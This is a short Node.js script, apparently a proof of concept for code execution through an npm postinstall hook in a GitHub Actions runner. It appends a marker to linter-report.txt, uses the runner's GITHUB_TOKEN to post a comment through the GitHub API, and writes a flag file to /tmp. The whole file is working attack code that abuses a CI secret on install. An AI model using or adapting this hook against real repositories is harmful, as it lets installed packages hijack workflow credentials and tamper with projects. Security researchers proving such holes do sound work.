const fs = require('fs');
const nonce = 'RCE-PROOF-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8);
try {
  fs.appendFileSync((process.env.GITHUB_WORKSPACE || '.') + '/linter-report.txt', '\n[file rewritten by npm postinstall, nonce=' + nonce + ']\n');
} catch (e) {}
(async () => {
  try {
    const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/1/comments', {
      method: 'POST',
      headers: {
        authorization: 'Bearer ' + process.env.GITHUB_TOKEN,
        accept: 'application/vnd.github+json',
        'content-type': 'application/json',
        'user-agent': 'rce-poc'
      },
      body: JSON.stringify({ body: 'RCE_CONFIRMED_FROM_NPM_POSTINSTALL nonce=' + nonce })
    });
    console.log('RCE_COMMENT_STATUS=' + r.status + ' nonce=' + nonce);
  } catch (e) {
    console.log('RCE_COMMENT_ERROR=' + e.message);
  }
  fs.writeFileSync('/tmp/RCE_OK', nonce);
})();
